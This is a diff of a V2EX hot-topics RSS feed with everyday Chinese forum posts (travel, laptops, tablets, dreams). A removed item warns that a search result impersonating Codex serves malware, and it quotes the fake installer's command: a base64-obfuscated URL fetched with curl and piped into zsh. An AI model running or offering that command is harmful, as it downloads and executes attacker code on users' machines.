@@ -4,7 +4,16 @@
     <title>V2EX Hot Topics</title>
     <link>https://www.v2ex.com/?tab=hot</link>
     <description>Hot topics from V2EX</description>
-    <lastBuildDate>Tue, 12 May 2026 12:59:32 GMT</lastBuildDate>
+    <lastBuildDate>Tue, 12 May 2026 15:39:38 GMT</lastBuildDate>
+    <item>
+      <title>马上要休婚假，想去日本玩，大家有没有攻略推荐~</title>
+      <link>https://www.v2ex.com/t/1212066</link>
+      <guid>v2ex-1212066</guid>
+      <pubDate>Tue, 12 May 2026 01:53:28 GMT</pubDate>
+      <description>&lt;p&gt;预期 6 月份休婚假，9 天的假期，预期 7-8 天在日本；
+第一次去日本，还没有做任何准备&lt;/p&gt;
+</description>
+    </item>
     <item>
       <title>卖房差点被骗了</title>
       <link>https://www.v2ex.com/t/1212035</link>
@@ -92,41 +101,6 @@
 </description>
     </item>
     <item>
-      <title>马上要休婚假，想去日本玩，大家有没有攻略推荐~</title>
-      <link>https://www.v2ex.com/t/1212066</link>
-      <guid>v2ex-1212066</guid>
-      <pubDate>Tue, 12 May 2026 01:53:28 GMT</pubDate>
-      <description>&lt;p&gt;预期 6 月份休婚假，9 天的假期，预期 7-8 天在日本；
-第一次去日本，还没有做任何准备&lt;/p&gt;
-</description>
-    </item>
-    <item>
-      <title>紧急避雷！ google 搜 Codex 第一个结果是个病毒，千万别装，我已中招！</title>
-      <link>https://www.v2ex.com/t/1212003</link>
-      <guid>v2ex-1212003</guid>
-      <pubDate>Mon, 11 May 2026 14:55:01 GMT</pubDate>
-      <description>&lt;p&gt;rt ，这个也确实怪我大意了，不小心中招了，发个帖希望各位站友别犯错&lt;/p&gt;
-&lt;p&gt;今天用 cc 编码，minmax 模型实在是问题多，我就去 google 搜 codex 官网，下载 codex 试试的
-搜索的第一个我就点击进去了（截止发帖时间，依然在第一个），我后面对比了下与 chatgpt 的页面一毛一样
-&lt;img alt=&quot;google 截图&quot; class=&quot;embedded_image&quot; loading=&quot;lazy&quot; referrerpolicy=&quot;no-referrer&quot; rel=&quot;noreferrer&quot; src=&quot;https://img.imgdd.com/907a8385-740a-4e6d-b4c4-f6ac4bc798ec.png&quot;/&gt; &lt;/p&gt;
-&lt;p&gt;然后我点击第一个链接进去后，按照页面提示点击安装按钮
-&lt;img alt=&quot;ScreenShot_2026-05-11_224758_197.png&quot; class=&quot;embedded_image&quot; loading=&quot;lazy&quot; referrerpolicy=&quot;no-referrer&quot; rel=&quot;noreferrer&quot; src=&quot;https://img.imgdd.com/9a53cfe9-e4c2-4c09-92ce-92011827beb7.png&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;安装命令我贴出来下&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;echo &quot;Downloading Codex: https://chatgpt.com/codex-app/Codex.dmg&quot; &amp;amp;&amp;amp; curl -s $(echo &quot;aHR0cHM6Ly9ncmVlbmFjdGl2LmNvbS9jdXJsLzRhZjU5ZjBmYTY3YjI5MDljOWQxMWFmM2UwMmE3OTE4MjcxMDhlMmQ1MjU5OGMyN2Y2Mjg2NmEwNDAzMDk2Mzc=&quot; | openssl base64 -d -A) | zsh
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这个脚本各种混淆，以及 echo 复杂。。翻译了好半天才找到位置&lt;/p&gt;
-</description>
-    </item>
-    <item>
-      <title>各位的 mbp 多久置换一次</title>
-      <link>https://www.v2ex.com/t/1212014</link>
-      <guid>v2ex-1212014</guid>
-      <pubDate>Mon, 11 May 2026 15:57:06 GMT</pubDate>
-      <description>&lt;p&gt;m3max 36G 的 mpb 用到现在除了电池有点衰减还有浏览器标签开多了 36G 稍微吃紧之外暂时还没有什么瓶颈，想知道换 m5max48G 提有什么其他体验有质的飞跃吗？看了新配置痒痒的，欲壑难填。
-看了下目前 m3 的残值 1W 左右，各位都是怎么置换的&lt;/p&gt;
-</description>
-    </item>
-    <item>
       <title>被多梦困扰的十几年</title>
       <link>https://www.v2ex.com/t/1212140</link>
       <guid>v2ex-1212140</guid>
@@ -139,6 +113,15 @@
 但有时候又会有点期待晚上会做什么梦，像开启一场未知冒险一样。
 很好奇有没有和我一样的人，大家都是怎么缓解、调整这种状态的？
 除此之外，我总觉得自己的大脑过度活跃，很难真正静下心来。只要开始放空想象，脑海里浮现的场景细节满满，真实感极强，如同亲身置身其中一般。&lt;/p&gt;
+</description>
+    </item>
+    <item>
+      <title>各位的 mbp 多久置换一次</title>
+      <link>https://www.v2ex.com/t/1212014</link>
+      <guid>v2ex-1212014</guid>
+      <pubDate>Mon, 11 May 2026 15:57:06 GMT</pubDate>
+      <description>&lt;p&gt;m3max 36G 的 mpb 用到现在除了电池有点衰减还有浏览器标签开多了 36G 稍微吃紧之外暂时还没有什么瓶颈，想知道换 m5max48G 提有什么其他体验有质的飞跃吗？看了新配置痒痒的，欲壑难填。
+看了下目前 m3 的残值 1W 左右，各位都是怎么置换的&lt;/p&gt;
 </description>
     </item>
     <item>
@@ -315,6 +298,13 @@ f7bd55456c6e02a46cc7a7fd642b81b3
 &lt;em&gt;3. 不因奖品而参与股市，得不偿失！&lt;/em&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 </description>
+    </item>
+    <item>
+      <title>老妈想买个平板看看视频，我对平板也不是很懂，希望大家推荐一下，二手的也行</title>
+      <link>https://www.v2ex.com/t/1212075</link>
+      <guid>v2ex-1212075</guid>
+      <pubDate>Tue, 12 May 2026 02:14:14 GMT</pubDate>
+      <description>老妈想买个平板看看视频，我对平板也不是很懂，希望大家推荐一下，二手的也行</description>
     </item>
   </channel>
 </rss>
